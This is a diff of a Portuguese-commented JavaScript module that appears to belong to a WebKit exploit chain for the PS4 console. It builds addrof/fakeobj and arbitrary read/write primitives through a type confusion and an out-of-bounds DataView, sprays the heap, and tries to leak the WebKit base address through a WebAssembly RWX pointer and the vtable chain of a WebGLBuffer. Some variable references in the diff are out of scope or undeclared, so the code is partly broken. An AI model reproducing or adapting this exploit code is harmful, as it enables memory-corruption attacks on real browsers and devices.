@@ -1,9 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v112 - R72 - Insistência na Depuração de Heap/WASM)
+// js/script3/testArrayBufferVictimCrash.mjs (v113 - R73 com Alocação Pioneira e Tentativa WebGL)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Confirmado o sucesso das primitivas de L/E e da instanciação WASM.
-// A falha no vazamento persiste devido à poluição de heap, mesmo com Heap Feng Shui agressivo.
-// O script reitera a necessidade crítica de depuração de baixo nível.
+// Implementa as recomendações da análise de proteções de heap do PS4 12.02.
+// - Alocação Pioneira de WebAssembly: tenta alocar WASM antes da poluição L/E.
+// - Ajuste na decodificação de ponteiros para lidar com o Pointer Tagging.
+// - Nova tentativa de vazamento via WebGL para bypass de Heap Partitioning.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -15,7 +16,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v112_R72_CriticalDebug";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v113_R73_PioneerWebGL";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -34,41 +35,73 @@ function doubleToInt64(double) {
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
-// --- Funções de Decodificação de Ponteiros (Recomendado pela Análise) ---
-const PS4_HEAP_BASE = AdvancedInt64.fromParts(0x20000000, 0); 
+// --- Funções de Decodificação de Ponteiros (Ajustada para a Análise do PS4) ---
+// A análise sugere que a tag de tipo está no high-word e o restante é offset.
+// Ponteiros WASM válidos podem ter tags 0x00-0x0F.
+// Ponteiros de objetos JS comuns têm tag 0x40.
+// O PS4_HEAP_BASE é um offset de base geral.
 
-function decodePS4Pointer(encoded) {
-    if (!isAdvancedInt64Object(encoded)) {
-        throw new TypeError(`Encoded value para decodePS4Pointer não é AdvancedInt64: ${String(encoded)}`);
+function decodePS4Pointer(encoded_adv_int64) {
+    if (!isAdvancedInt64Object(encoded_adv_int64)) {
+        throw new TypeError(`Encoded value para decodePS4Pointer não é AdvancedInt64: ${String(encoded_adv_int64)}`);
     }
 
-    const encoded_high_val = encoded.high();
-    const encoded_low_val = encoded.low();
+    const high_word = encoded_adv_int64.high();
+    const low_word = encoded_adv_int64.low();
 
-    const current_tag = (encoded_high_val & 0xFF000000) >>> 24;
-    const offset_high = (encoded_high_val & 0x00FFFFFF);
-    const offset_low = encoded_low_val;
+    const typeTag = (high_word & 0xFF000000) >>> 24; // Extrai a tag de tipo
+    const address_high_part = (high_word & 0x00FFFFFF); // Remove a tag da parte alta
 
-    const offset_adv_int64 = new AdvancedInt64(offset_low, offset_high);
+    // Reconstrói o endereço base + offset.
+    // Esta lógica assume que a tag está *no* ponteiro e precisa ser removida,
+    // e que o endereço resultante deve ser somado a uma base conhecida (PS4_HEAP_BASE).
+    // O mais provável é que a tag seja para validação e o endereço já seja virtualmente mapeado.
+    // Para simplificar e testar a hipótese de "tag de tipo", vamos reconstruir o ponteiro sem a tag.
+    // Se a tag é != 0 e != 0x40 e > 0x0F, pode ser um ponteiro inválido ou de outro tipo.
 
-    if (current_tag === 0x40) { // Se a tag 0x40 está presente
-        logS3(`    [decodePS4Pointer] Ponteiro com tag 0x40 detectada. Decodificando com PS4_HEAP_BASE...`, "debug");
-        return PS4_HEAP_BASE.add(offset_adv_int64); // Aplica a base
-    } else if (encoded.high() > 0x40000000 || encoded.high() === 0) { // Se já parece um endereço alto ou 0, não mexer.
-        logS3(`    [decodePS4Pointer] Ponteiro com high-word > 0x40000000 ou 0, ou tag diferente (${toHex(current_tag)}). Retornando como está.`, "debug");
-        return encoded;
-    } else { // Caso contrário, talvez seja um ponteiro compactado sem a tag 0x40 esperada. Retornar como está para não corromper.
-        logS3(`    [decodePS4Pointer] Ponteiro com tag incomum (${toHex(current_tag)}). Retornando como está.`, "debug");
-        return encoded;
+    logS3(`    [decodePS4Pointer] Original: ${encoded_adv_int64.toString(true)}, Tag: ${toHex(typeTag)}, High_part: ${toHex(address_high_part)}`, "debug");
+
+    // Condição da análise: "Ponteiros WASM válidos geralmente têm tags 0x00-0x0F"
+    // Isso é para o caso de o ponteiro *ser* um ponteiro RAW de uma partição específica.
+    // Se ele tem o padrão de um ponteiro virtual de 64 bits (como os que o addrof já retorna),
+    // a tag pode ser apenas um bit de hardening.
+    // A lógica original `encoded.high() & 0x00FFFFFF` removeria a tag.
+
+    // Vamos tentar uma decodificação simples: remover a tag e ver se o endereço se torna válido.
+    // Se a tag não é uma das esperadas para ponteiros válidos (0x00-0x0F ou 0x40),
+    // pode ser um dado corrompido ou outro tipo de tag.
+    
+    // Considerando o padrão `0x402abd70_a3d70a4d` que vimos, onde `0x40` é a parte superior do high word.
+    // Se a tag é 0x40 para objetos JS, e a instância WASM também é um objeto JS, então a tag 0x40 é esperada.
+    // A análise sugere que se `typeTag > 0x0F`, talvez não seja um ponteiro bruto WASM.
+
+    // Tentativa 1: Remover apenas a tag e retornar o ponteiro.
+    const decoded_no_tag = new AdvancedInt64(low_word, address_high_part);
+    logS3(`    [decodePS4Pointer] Decodificado (removendo tag): ${decoded_no_tag.toString(true)}`, "debug");
+
+    // Se o ponteiro decodificado (sem a tag de tipo) ainda parece inválido, ele pode ser corrompido
+    // ou pertencer a outra partição que não se encaixa na decodificação simples.
+    // A análise da tag "0x000000de" no log anterior para `0xdeadbeef_cafebabe` (onde `0xde` é a tag)
+    // indica que `0xdeadbeef_cafebabe` é o valor que está na memória. A decodificação só funciona se o valor
+    // na memória FOR um ponteiro válido com tag. Se é seu lixo, ele não terá uma tag real.
+    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE)) {
+        logS3(`    [decodePS4Pointer] Valor de poluição detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
+        return encoded_adv_int64; // Não é um ponteiro para decodificar, é o valor de poluição
     }
+    
+    // Retornamos o ponteiro sem a tag. A sanidade será verificada depois.
+    // A adição da PS4_HEAP_BASE só faria sentido se o `encoded` fosse um offset puro.
+    // Como `addrof` já retorna endereços como `0x402a...`, vamos tentar apenas remover a tag.
+    return decoded_no_tag;
 }
+
 
 // =======================================================================================
 // FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados, Heap Feng Shui, Confirmação de Poluição) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento (Alocação Pioneira, WebGL) ---`, "test");
 
     let final_result = {
         success: false,
@@ -79,123 +112,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Valor de poluição
 
     try {
-        // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---
-        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) {
-            throw new Error("Falha ao obter primitiva OOB.");
-        }
-        logS3("OOB DataView obtido com sucesso.", "info");
+        // --- FASE 1: Alocação Pioneira de WebAssembly (Antes da Poluição de L/E) ---
+        logS3("--- FASE 1: Alocação Pioneira de WebAssembly ---", "subtest");
+        let wasmInstance = null;
+        let wasm_instance_addr = null;
 
-        // --- VERIFICAÇÃO: OOB DataView m_length ---
-        const oob_dv = getOOBDataView();
-        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Direto de core_exploit.mjs
-        const OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // De config.mjs
-        const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW; // Calculado
-
-        const oob_m_length_val = oob_dv.getUint32(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET, true);
-        logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug");
-        if (oob_m_length_val !== 0xFFFFFFFF) {
-            throw new Error(`OOB DataView's m_length não foi corretamente expandido. Lido: ${toHex(oob_m_length_val)}`);
-        }
-        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good");
-
-
-        const confused_array = [13.37];
-        const victim_array = [{ a: 1 }];
-        const addrof = (obj) => {
-            victim_array[0] = obj;
-            const addr = doubleToInt64(confused_array[0]);
-            logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug");
-            return addr;
-        };
-        const fakeobj = (addr) => {
-            confused_array[0] = int64ToDouble(addr);
-            const obj = victim_array[0];
-            logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
-            return obj;
-        };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
-
-        // --- VERIFICAÇÃO: addrof/fakeobj ---
-        const testObjectForPrimitives = { dummy_prop_A: 0xAAAAAAAA, dummy_prop_B: 0xBBBBBBBB };
-        const testAddrOfPrimitive = addrof(testObjectForPrimitives);
-        if (!isAdvancedInt64Object(testAddrOfPrimitive) || (testAddrOfPrimitive.low() === 0 && testAddrOfPrimitive.high() === 0)) {
-            throw new Error("Addrof primitive retornou endereço inválido (0x0).");
-        }
-        logS3(`VERIFICAÇÃO: Endereço de testObjectForPrimitives (${JSON.stringify(testObjectForPrimitives)}) obtido: ${testAddrOfPrimitive.toString(true)}`, "info");
-
-        const re_faked_object_primitive = fakeobj(testAddrOfPrimitive);
-        if (re_faked_object_primitive === null || typeof re_faked_object_primitive !== 'object') {
-             throw new Error("Fakeobj retornou um valor inválido (null ou não-objeto).");
-        }
-        try {
-            if (re_faked_object_primitive.dummy_prop_A !== 0xAAAAAAAA || re_faked_object_primitive.dummy_prop_B !== 0xBBBBBBBB) {
-                throw new Error(`Fakeobj: Propriedades do objeto re-faked não correspondem. A: ${toHex(re_faked_object_primitive.dummy_prop_A)}, B: ${toHex(re_faked_object_primitive.dummy_prop_B)}`);
-            }
-            logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good");
-        } catch (e) {
-            throw new Error(`Erro ao acessar propriedade do objeto re-faked (indicando falha no fakeobj): ${e.message}`);
-        }
-
-        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
-        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
-        const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof(leaker);
-        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
-        
-        const arb_read_final = (addr) => {
-            logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
-            leaker.obj_prop = fakeobj(addr); // Make leaker.obj_prop point to 'addr'
-            const result = doubleToInt64(leaker.val_prop); // Read what 'val_prop' now points to
-            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
-            return result;
-        };
-        const arb_write_final = (addr, value) => {
-            logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
-            leaker.obj_prop = fakeobj(addr);
-            leaker.val_prop = int64ToDouble(value);
-            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
-        };
-        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
-
-        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
-        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
-        
-        // 1. Spray de objetos para estabilizar a memória e mitigar o GC
-        const spray = [];
-        for (let i = 0; i < 1000; i++) {
-            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i });
-        }
-        const test_obj_for_rw_verification = spray[500]; // Pega um objeto do meio do spray para testar R/W
-        logS3("Spray de 1000 objetos concluído para estabilização.", "info");
-
-        // 2. Teste de Escrita e Leitura com NOVO VALOR DE POLUIÇÃO
-        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
-        logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
-        
-        // As propriedades inline de um JSObject simples (como 'test_obj_for_rw_verification')
-        // geralmente começam no offset 0x10 (o BUTTERFLY_OFFSET).
-        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); 
-        
-        logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
-        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);
-
-        const value_read_for_verification = arb_read_final(prop_spray_A_addr);
-        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");
-
-        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
-            logS3("+++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. +++++++++++", "vuln");
-            final_result.success = true; // Confirma que L/E funciona
-            final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
-        } else {
-            throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
-        }
-
-        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT via WebAssembly ---
-        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBASSAMBLY ---", "subtest");
-        let webkit_base_candidate = AdvancedInt64.Zero;
-        
         try {
             // ** Heap Feng Shui Agressivo (antes do WASM) **
             logS3("  Executando Heap Feng Shui agressivo antes do WASM para tentar limpar o heap...", "info");
@@ -213,7 +134,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             aggressive_feng_shui_objects = null;
 
             await PAUSE_S3(5000); // Pausa ainda maior (5 segundos)
-            logS3(`  Heap Feng Shui concluído. Pausa (5000ms) finalizada. Tentando compilar e instanciar WebAssembly...`, "debug");
+            logS3(`  Heap Feng Shui concluído. Pausa (5000ms) finalizada. Tentando compilar e instanciar WebAssembly (Pioneira)...`, "debug");
 
             // Código WASM corrigido: uma função que retorna 1.
             const wasmCodeBuffer = new Uint8Array([
@@ -224,39 +145,100 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x01, 0x0b  // Code section: func 0, size 4, i32.const 1, end
             ]);
             
-            let wasmInstance = null;
-            try {
-                const wasmModule = await WebAssembly.compile(wasmCodeBuffer);
-                wasmInstance = new WebAssembly.Instance(wasmModule);
-                // Call the exported function to potentially trigger JIT compilation
-                // This might be crucial for the RWX pointer to be valid.
-                wasmInstance.exports.run(); 
-                logS3("  WebAssembly Módulo e Instância criados e função 'run' executada com sucesso.", "good");
-            } catch (wasm_e) {
-                logS3(`  ERRO ao compilar/instanciar WebAssembly: ${wasm_e.message}`, "critical");
-                throw new Error(`Falha no WebAssembly: ${wasm_e.message}`);
-            }
+            const wasmModule = await WebAssembly.compile(wasmCodeBuffer);
+            wasmInstance = new WebAssembly.Instance(wasmModule);
+            wasmInstance.exports.run(); // Executar para forçar JIT compilation
+            logS3("  WebAssembly Módulo e Instância criados e função 'run' executada com sucesso (Pioneira).", "good");
 
             // Obter o endereço da instância WebAssembly
-            // A análise sugere `addrof_func(instance)`.
-            const wasm_instance_addr = addrof(wasmInstance);
-            logS3(`  Endereço da instância WebAssembly: ${wasm_instance_addr.toString(true)}`, "info");
+            wasm_instance_addr = addrof(wasmInstance);
+            logS3(`  Endereço da instância WebAssembly (Pioneira): ${wasm_instance_addr.toString(true)}`, "info");
 
             if (wasm_instance_addr.low() === 0 && wasm_instance_addr.high() === 0) {
-                logS3("    Addrof retornou 0 para instância WebAssembly.", "error");
-                throw new Error("Addrof retornou 0 para instância WebAssembly.");
+                logS3("    Addrof retornou 0 para instância WebAssembly (Pioneira).", "error");
+                throw new Error("Addrof retornou 0 para instância WebAssembly (Pioneira).");
             }
             if (wasm_instance_addr.high() === 0x7ff80000 && wasm_instance_addr.low() === 0) {
-                logS3("    Addrof para instância WebAssembly é NaN.", "error");
-                throw new Error("Addrof para instância WebAssembly é NaN.");
+                logS3("    Addrof para instância WebAssembly (Pioneira) é NaN.", "error");
+                throw new Error("Addrof para instância WebAssembly (Pioneira) é NaN.");
             }
-            // Verificar poluição para o endereço da instância WASM
-            if (wasm_instance_addr.equals(NEW_POLLUTION_VALUE)) {
-                logS3(`    ALERTA DE POLUIÇÃO: Endereço da instância WebAssembly (${wasm_instance_addr.toString(true)}) está lendo o valor de poluição. Isso é crítico!`, "critical");
-                throw new Error("Endereço da instância WebAssembly poluído. Heap layout ainda é um problema.");
-            }
+            // Não verificamos poluição aqui, pois esta é a alocação PIONEIRA.
+            // A poluição virá depois.
+
+        } catch (wasm_e) {
+            logS3(`  ERRO CRÍTICO na alocação Pioneira de WebAssembly: ${wasm_e.message}`, "critical");
+            throw new Error(`Falha na alocação Pioneira de WebAssembly: ${wasm_e.message}`);
+        }
+        
+        // --- FASE 2: Obtenção de Primitivas OOB e addrof/fakeobj ---
+        // A primitiva OOB continua funcionando normalmente, e addrof/fakeobj são necessários para L/E.
+        logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!getOOBDataView()) {
+            throw new Error("Falha ao obter primitiva OOB.");
+        }
+        logS3("OOB DataView obtido com sucesso.", "info");
+
+        const confused_array = [13.37];
+        const victim_array = [{ a: 1 }];
+        const addrof_local = (obj) => { // Renomeado para evitar conflito com 'addrof' global, se aplicável
+            victim_array[0] = obj;
+            const addr = doubleToInt64(confused_array[0]);
+            return addr;
+        };
+        const fakeobj_local = (addr) => { // Renomeado
+            confused_array[0] = int64ToDouble(addr);
+            const obj = victim_array[0];
+            return obj;
+        };
+        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
+
+        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
+        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
+        const leaker = { obj_prop: null, val_prop: 0 };
+        const leaker_addr = addrof_local(leaker); // Usar local
+        
+        const arb_read_final = (addr) => {
+            leaker.obj_prop = fakeobj_local(addr); // Usar local
+            const result = doubleToInt64(leaker.val_prop);
+            return result;
+        };
+        const arb_write_final = (addr, value) => {
+            leaker.obj_prop = fakeobj_local(addr); // Usar local
+            leaker.val_prop = int64ToDouble(value);
+        };
+        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
 
+        // --- FASE 4: Verificação Funcional de L/E e Poluição Intencional ---
+        logS3("--- FASE 4: Verificação Funcional de L/E e Poluição Intencional ---", "subtest");
+        
+        // Poluição de uma região de heap separada para o teste de L/E
+        const safe_test_region_array = new Array(100); // Cria um array em uma região separada
+        const safe_test_region_addr = addrof_local(safe_test_region_array);
+        logS3(`  Endereço da região segura para teste L/E: ${safe_test_region_addr.toString(true)}`, "info");
+        
+        // Escreve o valor de poluição na região segura para teste L/E
+        const prop_spray_A_addr = safe_test_region_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); // offset 0x10 para primeira prop
+        logS3(`  Escrevendo VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} na região segura (${prop_spray_A_addr.toString(true)})...`, "info");
+        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);
+
+        const value_read_for_verification = arb_read_final(prop_spray_A_addr);
+        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA DA REGIÃO SEGURA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");
+
+        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
+            logS3("+++++++++++ SUCESSO! Valor de poluição escrito e lido corretamente em região segura. L/E arbitrária é 100% funcional. +++++++++++", "vuln");
+            final_result.success = true;
+            final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
+        } else {
+            throw new Error(`A verificação de L/E falhou na região segura. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
+        }
+
+        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT via WebAssembly ---
+        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBASSAMBLY ---", "subtest");
+        
+        // O `wasm_instance_addr` já foi obtido na FASE 1.
+        try {
             // Vazar o ponteiro RWX do código WASM
             // A análise sugere offset 0x38 da instância para o rwxPtr.
             const rwx_ptr_addr_in_instance = wasm_instance_addr.add(0x38); // Offset 0x38 da instância para o ponteiro RWX
@@ -264,7 +246,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const rwx_ptr_encoded = arb_read_final(rwx_ptr_addr_in_instance);
             logS3(`  Lido Ponteiro RWX (Codificado/Tag): ${rwx_ptr_encoded.toString(true)}`, "leak");
 
-            // Decodificar o ponteiro (se aplicável, com base na análise de proteções)
+            // Decodificar o ponteiro (com base na análise de proteções)
             const rwx_ptr_decoded = decodePS4Pointer(rwx_ptr_encoded);
             logS3(`  Ponteiro RWX Decodificado: ${rwx_ptr_decoded.toString(true)}`, "leak");
 
@@ -283,8 +265,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Ponteiro RWX decodificado não passou na verificação de sanidade.");
             }
             
-            // Tentar usar o rwx_ptr_decoded como se fosse JSC::JSObject::put para calcular a base do WebKit.
-            // Isso assume que o código JITado do WASM está em um offset previsível da base do WebKit.
+            // Tentar calcular WebKit Base a partir do Ponteiro RWX
             logS3(`  Tentando calcular WebKit Base a partir do Ponteiro RWX usando offset de JSC::JSObject::put como referência...`, "debug");
             const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]; // Offset de uma função WebKit
             if (!expected_put_offset_str) {
@@ -317,7 +298,98 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             final_result.webkit_leak_details.success = false;
         }
 
-        // Se chegamos aqui, o vazamento WASM falhou.
+
+        // --- FASE 6: Tentativa de Vazamento via WebGL (Se WASM falhar) ---
+        logS3("--- FASE 6: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBGL (Backup) ---", "subtest");
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (!gl) {
+                throw new Error("WebGL context não disponível.");
+            }
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            
+            // Forçar exposição de metadados
+            // A análise sugere gl.bufferData(gl.ARRAY_BUFFER, 1000, gl.STATIC_DRAW);
+            // Para maximizar a chance de vazamento de ponteiro, podemos tentar um tamanho maior ou variação.
+            gl.bufferData(gl.ARRAY_BUFFER, 0x10000, gl.STATIC_DRAW); // Alocar um buffer maior
+            
+            const gl_buffer_addr = addrof_local(buffer); // Obter o addrof do objeto JS do buffer WebGL
+            logS3(`  Endereço do objeto WebGLBuffer (JS): ${gl_buffer_addr.toString(true)}`, "info");
+
+            if (gl_buffer_addr.low() === 0 && gl_buffer_addr.high() === 0) {
+                throw new Error("Addrof retornou 0 para WebGLBuffer.");
+            }
+            if (gl_buffer_addr.high() === 0x7ff80000 && gl_buffer_addr.low() === 0) {
+                throw new Error("Addrof para WebGLBuffer é NaN.");
+            }
+            // A instância WebGLBuffer (objeto JS) também deve ter uma Structure e pode ter ponteiros.
+            // Para vazar a base do WebKit, precisamos de um ponteiro para código.
+            // A análise sugere que a WebGL pode "forçar exposição de metadados".
+            // Isso significa que os metadados internos (ClassInfo, vtables) do objeto WebGLBuffer podem estar
+            // em uma partição acessível ou ter ponteiros para outras.
+
+            // Vamos tentar a mesma cadeia de vazamento (Structure -> ClassInfo -> put)
+            // se o objeto WebGLBuffer (JS) for um JSObject padrão.
+            // Esta é a mesma lógica de `performLeakAttemptFromObject`, mas adaptada para WebGL.
+            logS3(`  Tentando vazamento WebGL via cadeia Structure/vtable...`, "debug");
+            const gl_structure_ptr_addr = gl_buffer_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+            const gl_structure_addr = arb_read_final(gl_structure_ptr_addr);
+            logS3(`    Lido Structure* do WebGLBuffer: ${gl_structure_addr.toString(true)}`, "leak");
+            
+            if (gl_structure_addr.equals(NEW_POLLUTION_VALUE)) {
+                logS3(`    ALERTA DE POLUIÇÃO: Structure* do WebGLBuffer está lendo o valor de poluição.`, "warn");
+                throw new Error("Structure* do WebGLBuffer poluído.");
+            }
+            if (!isAdvancedInt64Object(gl_structure_addr) || gl_structure_addr.low() === 0 && gl_structure_addr.high() === 0) throw new Error("Falha ao vazar Structure* (endereço é 0x0).");
+
+            // Ler ClassInfo e depois o ponteiro put da Structure do WebGLBuffer.
+            const gl_class_info_ptr_addr = gl_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
+            const gl_class_info_addr = arb_read_final(gl_class_info_ptr_addr);
+            logS3(`    Lido ClassInfo* do WebGLBuffer: ${gl_class_info_addr.toString(true)}`, "leak");
+            if (gl_class_info_addr.equals(NEW_POLLUTION_VALUE)) {
+                logS3(`    ALERTA DE POLUIÇÃO: ClassInfo* do WebGLBuffer está lendo o valor de poluição.`, "warn");
+                throw new Error("ClassInfo* do WebGLBuffer poluído.");
+            }
+            if (!isAdvancedInt64Object(gl_class_info_addr) || gl_class_info_addr.low() === 0 && gl_class_info_addr.high() === 0) throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0).");
+
+
+            const gl_put_func_ptr_addr = gl_structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
+            const gl_put_func_addr = arb_read_final(gl_put_func_ptr_addr);
+            logS3(`    Lido JSC::JSObject::put do WebGLBuffer: ${gl_put_func_addr.toString(true)}`, "leak");
+            if (gl_put_func_addr.equals(NEW_POLLUTION_VALUE)) {
+                logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put do WebGLBuffer está lendo o valor de poluição.`, "warn");
+                throw new Error("JSC::JSObject::put do WebGLBuffer poluído.");
+            }
+            if (!isAdvancedInt64Object(gl_put_func_addr) || gl_put_func_addr.low() === 0 && gl_put_func_addr.high() === 0) throw new Error("Falha ao vazar JSC::JSObject::put (endereço é 0x0).");
+
+            // Calcular a base do WebKit usando o ponteiro do WebGL
+            const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
+            const expected_put_offset = new AdvancedInt64(parseInt(expected_put_offset_str, 16));
+            webkit_base_candidate = gl_put_func_addr.sub(expected_put_offset);
+            logS3(`  Candidato a WebKit Base (Calculado do WebGL): ${webkit_base_candidate.toString(true)}`, "leak");
+
+            const is_sane_base_gl = webkit_base_candidate.high() > 0x40000000 && (webkit_base_candidate.low() & 0xFFF) === 0;
+            if (!is_sane_base_gl) {
+                throw new Error("Candidato a WebKit base (WebGL) não passou na verificação de sanidade.");
+            }
+
+            final_result.webkit_leak_details = {
+                success: true,
+                msg: `Endereço base do WebKit vazado com sucesso via WebGL.`,
+                webkit_base_candidate: webkit_base_candidate.toString(true),
+                gl_buffer_pointer: gl_put_func_addr.toString(true)
+            };
+            logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via WebGL! ++++++++++++`, "vuln");
+            return final_result; // Retornar o resultado final imediatamente se for bem-sucedido.
+
+        } catch (webgl_leak_e) {
+            logS3(`  Falha na tentativa de vazamento com WebGL: ${webgl_leak_e.message}`, "warn");
+            final_result.webkit_leak_details.msg = `Falha na tentativa de vazamento do WebKit via WebGL: ${webgl_leak_e.message}`;
+            final_result.webkit_leak_details.success = false;
+        }
+
+        // Se chegamos aqui, todas as estratégias falharam.
         throw new Error("Nenhuma estratégia de vazamento de WebKit foi bem-sucedida após Heap Feng Shui e testes múltiplos.");
 
     } catch (e) {
@@ -333,13 +405,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     if (!final_result.webkit_leak_details.success) {
         logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical");
         logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou. Verifique os logs acima para o motivo exato.", "critical");
-        logS3("A falha mais recente indica um problema de reutilização de heap ou proteções de alocação/ponteiros no PS4 12.02.", "critical");
-        logS3("RECOMENDAÇÃO: A única forma de avançar é com depuração de baixo nível. Use um depurador (como GDB/LLDB) conectado ao processo do WebKit na PS4.", "critical");
